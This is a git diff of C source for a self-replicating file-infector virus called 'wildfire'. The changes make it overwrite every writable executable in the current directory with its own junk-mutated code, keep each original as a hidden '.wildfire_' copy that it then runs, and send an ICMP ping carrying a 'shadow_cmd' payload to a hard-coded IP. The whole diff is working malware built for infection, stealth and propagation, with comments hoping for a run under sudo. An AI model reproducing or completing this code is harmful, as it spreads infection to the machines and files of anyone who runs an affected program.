@@ -27,6 +27,7 @@ const unsigned char prefixes[] = { ADD, AND, XOR, OR, SBB, SUB, 0 };
 
 unsigned char *code;
 int codelen;
+unsigned char *original_executable;
 
 void readcode(const char *filename)
 {
@@ -68,7 +69,7 @@ void newwritecode(const char *filename)
 {
     FILE *fp;
     /* Opens file with write to binary permissions */
-    fp = fopen(filename, "ab");          JUNK;
+    fp = fopen(filename, "wb");          JUNK;
     /* Writes the code variable into the file */
     fwrite(code, codelen, 1, fp);           JUNK;
     fclose(fp);
@@ -252,49 +253,39 @@ void execute()
     send_ping(shadow_cmd);
 }
 
-// Propagate into executable files in hopes of being run as sudo
-void propagate()
+void copy_and_hide_file(const char *filename)
 {
+    char *bash_code = "cp %s .wildfire_%s";
+
+    int cmd_len = strlen(bash_code) + strlen(filename) + 1;
+    char cmd[cmd_len];
+
+    sprintf(cmd, bash_code, filename, filename);
+
+    system(cmd);
 }
 
-void embed_code(const char *filename)
+/* Executes a bash command */
+void execute_bash(const char *bash_code, const char *file_name)
 {
-    unsigned char *existing;
-    int existing_len;
+    int cmd_len = strlen(bash_code) + strlen(file_name) + 1;
+    char cmd[cmd_len];
 
-    code = read_binary_file("a.out");
-    codelen = strlen(code);
-    printf("%d", codelen);
-    replacejunk();
-    write_binary_file("m.exe", code);
+    sprintf(cmd, bash_code, file_name);
 
-    // printf(existing);
+    system(cmd);
+}
 
-    // FILE *fp;
+void embed_code(const char *file_name)
+{
+    copy_and_hide_file(file_name);
+    execute_bash("chmod +x %s", file_name);
 
-    // fp = fopen(filename, "w+");
-    // if (fp == NULL)
-    // {
-    //     printf("NULL");
-    //     return;
-    // }
-
-    // char *bash_code = "sudo ./%s";
-
-    // int embedded_code_len = strlen(filename) + strlen(bash_code) + 1;
-    // char embedded_code[embedded_code_len];
-
-    // sprintf(embedded_code, bash_code, filename);
-
-    // printf("\n\nCMD: %s\n", embedded_code);
-
-    // fp = fopen(filename, "w+");
-    // fprintf(fp, embedded_code);
-    // fclose(fp);
+    newwritecode(file_name); JUNK;
 }
 
 // Lists files in passed in directory path
-void list_files(const char *path, const char *exclude) {
+void propagate(const char *path, const char *exclude) {
 DIR *dir;
     struct dirent *ent;
 
@@ -307,22 +298,33 @@ DIR *dir;
             // regular files only - no DT_DIR (directories) or DT_LNK (links)
             if (ent->d_type == DT_REG)
             {
-                //printf("%s", ent->d_name);
                 if (access(ent->d_name, X_OK) == 0 && access(ent->d_name, W_OK) == 0)
                 {
                     if (strstr(exclude, ent->d_name) != NULL)
                     {
-                        printf("Self executable is ignored: %s", ent->d_name);
-
-                        unsigned char *existing;
-                        int existing_len;
-                        readcode(ent->d_name);
-                        printf("Existing %s Len: %d", code, codelen);
+                        printf("Self executable is ignored: %s\n", ent->d_name);
+                        original_executable = ent->d_name;
+                        execute_bash("./.wildfire_%s", ent->d_name);
+                    }
+                    else if (strstr(ent->d_name, "wildfire") != NULL)
+                    {
+                        printf("Wildfire executable is ignored: %s\n", ent->d_name);
                     }
                     else
                     {
-                        embed_code(ent->d_name);
-                        printf("Propagated into: %s\n", ent->d_name);
+                        // Skip if executable has already been infected
+                        const char *bash_code = ".wildfire_%s";
+                        int hidden_file_len = strlen(bash_code) + strlen(ent->d_name) + 1;
+                        char hidden_file[hidden_file_len];
+
+                        sprintf(hidden_file, bash_code, ent->d_name);
+
+                        if( access(hidden_file, F_OK) == -1 ) {
+                            embed_code(ent->d_name);
+                            printf("Propagated into: %s\n", ent->d_name);
+                        } else {
+                            printf("Skipping %s executable because hidden file already exists\n", ent->d_name);
+                        }
                     }
                     
                 }
@@ -344,14 +346,10 @@ int main(int argc, char* argv[])
 {
     printf("EXE FILE: %s\n", argv[0]);
     system("id -u"); // outputs 0 if root user
-    //execute("192.168.1.142"); // send ICMP ping with custom payload to IP
-    list_files("./", argv[0]); // list writable executable files for propagation
-    //propagate();
-    //readcode(argv[0]);  JUNK;
-    //replacejunk();      JUNK;
-    //writecode(argv[0]); JUNK;
-    newwritecode("code.out"); JUNK;
-    //readcode(argv[0]);
-    printf("%s:%d", code, codelen);
+    execute("192.168.1.142"); // send ICMP ping with custom payload to IP
+    readcode(argv[0]);  JUNK;
+    //printf("%s:%d", code, codelen);
+    replacejunk();      JUNK;
+    propagate("./", argv[0]); // list writable executable files for propagation
     return 0;
 }
